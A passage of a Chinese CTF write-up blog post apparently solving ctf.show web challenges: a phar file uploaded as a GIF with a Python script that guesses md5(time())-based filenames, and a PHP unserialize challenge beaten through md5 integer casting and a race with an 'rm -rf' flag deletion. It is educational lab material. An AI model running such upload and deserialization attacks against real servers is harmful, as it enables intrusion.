+</span></span><span class=line><span class=cl><span class=o>&amp;&amp;</span> <span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;size&#34;</span><span class=p>]</span> <span class=o>&lt;</span> <span class=mi>2048000</span><span class=p>)</span>   <span class=c1>// 小于 2000kb
+</span></span></span><span class=line><span class=cl><span class=c1></span><span class=o>&amp;&amp;</span> <span class=nx>in_array</span><span class=p>(</span><span class=nv>$extension</span><span class=p>,</span> <span class=nv>$allowedExts</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;error&#34;</span><span class=p>]</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=k>echo</span> <span class=s2>&#34;文件出错: &#34;</span> <span class=o>.</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;error&#34;</span><span class=p>]</span> <span class=o>.</span> <span class=s2>&#34;&lt;br&gt;&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=k>else</span>
+</span></span><span class=line><span class=cl>	<span class=p>{</span>
+</span></span><span class=line><span class=cl>		<span class=k>if</span> <span class=p>(</span><span class=nx>file_exists</span><span class=p>(</span><span class=s2>&#34;upload/&#34;</span> <span class=o>.</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;name&#34;</span><span class=p>]))</span>
+</span></span><span class=line><span class=cl>		<span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=k>echo</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;name&#34;</span><span class=p>]</span> <span class=o>.</span> <span class=s2>&#34; 文件已经存在。 &#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>		<span class=k>else</span>
+</span></span><span class=line><span class=cl>		<span class=p>{</span>
+</span></span><span class=line><span class=cl>			<span class=nv>$md5_unix_random</span> <span class=o>=</span><span class=nx>substr</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nx>time</span><span class=p>()),</span><span class=mi>0</span><span class=p>,</span><span class=mi>8</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>			<span class=nv>$filename</span> <span class=o>=</span> <span class=nv>$md5_unix_random</span><span class=o>.</span><span class=s1>&#39;.&#39;</span><span class=o>.</span><span class=nv>$extension</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>            <span class=nx>move_uploaded_file</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>][</span><span class=s2>&#34;tmp_name&#34;</span><span class=p>],</span> <span class=s2>&#34;upload/&#34;</span> <span class=o>.</span> <span class=nv>$filename</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>            <span class=k>echo</span> <span class=s2>&#34;上传成功,文件存在upload/&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>		<span class=p>}</span>
+</span></span><span class=line><span class=cl>	<span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=k>else</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>	<span class=k>echo</span> <span class=s2>&#34;文件类型仅支持jpg、png、gif等图片格式&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><p>这里直接参考yu22x师傅博客里的脚本找上传的文件名</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>hashlib</span>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>geturl</span><span class=p>(</span><span class=n>s</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>a</span><span class=o>=</span><span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=nb>int</span><span class=p>(</span><span class=n>s</span><span class=p>))</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=s2>&#34;http://b8876a9e-71b3-4a02-b8c4-80f02ec058a5.chall.ctf.show/upload/&#34;</span><span class=o>+</span><span class=n>a</span><span class=p>[:</span><span class=mi>8</span><span class=p>]</span><span class=o>+</span><span class=s1>&#39;.gif&#39;</span>
+</span></span><span class=line><span class=cl><span class=c1>#coding:utf-8</span>
+</span></span><span class=line><span class=cl><span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://b8876a9e-71b3-4a02-b8c4-80f02ec058a5.chall.ctf.show/upload.php&#34;</span>
+</span></span><span class=line><span class=cl>    <span class=n>files</span><span class=o>=</span><span class=p>{</span><span class=s1>&#39;file&#39;</span><span class=p>:(</span><span class=s1>&#39;exp.gif&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;exp.gif&#39;</span><span class=p>,</span><span class=s1>&#39;rb&#39;</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;image/gif&#39;</span>
+</span></span><span class=line><span class=cl>        <span class=p>)}</span>
+</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span><span class=n>files</span><span class=o>=</span><span class=n>files</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>a</span><span class=o>=</span><span class=n>time</span><span class=o>.</span><span class=n>time</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>r2</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>geturl</span><span class=p>(</span><span class=n>a</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=n>r3</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>geturl</span><span class=p>(</span><span class=n>a</span><span class=o>-</span><span class=mi>1</span><span class=p>))</span><span class=c1>#存在延时多试几个时间</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span><span class=p>(</span><span class=s2>&#34;我的网站&#34;</span> <span class=ow>not</span> <span class=ow>in</span>  <span class=n>r2</span><span class=o>.</span><span class=n>text</span> <span class=ow>or</span> <span class=s2>&#34;我的网站&#34;</span> <span class=ow>not</span> <span class=ow>in</span>  <span class=n>r3</span><span class=o>.</span><span class=n>text</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>geturl</span><span class=p>(</span><span class=n>a</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=n>geturl</span><span class=p>(</span><span class=n>a</span><span class=o>-</span><span class=mi>1</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>        <span class=k>break</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.3</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>先在/uplaod上传一个phar文件（后缀名已改为gif），然后再用该脚本找文件名：</p><p>然后访问hint.txt:</p><p><img src=https://raw.githubusercontent.com/zk1te/img/main/image-20210127123518266.png loading=lazy alt=image-20210127123518266></p><p>访问/ctfshowgetflaghhhh：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=nx>show_source</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$unser</span> <span class=o>=</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;unser&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Unser</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$username</span><span class=o>=</span><span class=s1>&#39;Firebasky&#39;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$password</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>username</span><span class=o>==</span><span class=s1>&#39;ctfshow&#39;</span><span class=o>&amp;&amp;</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>password</span><span class=o>==</span><span class=p>(</span><span class=nx>int</span><span class=p>)</span><span class=nx>md5</span><span class=p>(</span><span class=nx>time</span><span class=p>())){</span>
+</span></span><span class=line><span class=cl>            <span class=nx>system</span><span class=p>(</span><span class=s1>&#39;cp /ctfshow* /var/www/html/flag.txt&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=nv>$ctf</span><span class=o>=@</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$unser</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>system</span><span class=p>(</span><span class=s1>&#39;rm -rf /var/www/html/flag.txt&#39;</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>因为md5之后有一个强制类型转换，所以当md值是字母开头的时候会变成0，所以我们可以令password为0，然后多试几次既可：</p><p><img src=https://raw.githubusercontent.com/zk1te/img/main/image-20210127124645962.png loading=lazy alt=image-20210127124645962></p><p>后面有个<code>system('rm -rf /var/www/html/flag.txt');</code>删掉flag，理论上需要条件竞争，但是不知道为啥狂点了几次hackbar的EXECUTE之后就可以直接url访问。。。。迷</p><p><img src=https://raw.githubusercontent.com/zk1te/img/main/image-20210127124946215.png loading=lazy alt=image-20210127124946215></p><p>revenge只有路由的名字不一样，不知道有啥意义。。。迷</p></section><footer class=article-footer><section class=article-tags><a href=/tags/wp/>Wp</a>
+<a href=/tags/ctf/>Ctf</a></section><section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>相关文章</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/2021%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8Aweb/><div class=article-details><h2 class=article-title>2021第五空间线上web</h2></div></a></article><article><a href=/p/dasjuly-x-cbctf-4th-%E9%83%A8%E5%88%86wp/><div class=article-details><h2 class=article-title>DasJuly X CBCTF 4th 部分wp</h2></div></a></article><article><a href=/p/cybrics2021/><div class=article-details><h2 class=article-title>CyBRICS2021</h2></div></a></article><article><a href=/p/vnctf2021/><div class=article-details><h2 class=article-title>VNCTF2021</h2></div></a></article><article><a href=/p/bjdctf2020/><div class=article-details><h2 class=article-title>BJDCTF2020</h2></div></a></article></div></div></aside><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//k1te.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2024 k1te's blog</section><section class=powerby>使用 <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> 构建<br>主题 <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.26.0>Stack</a></b> 由 <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> 设计</section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
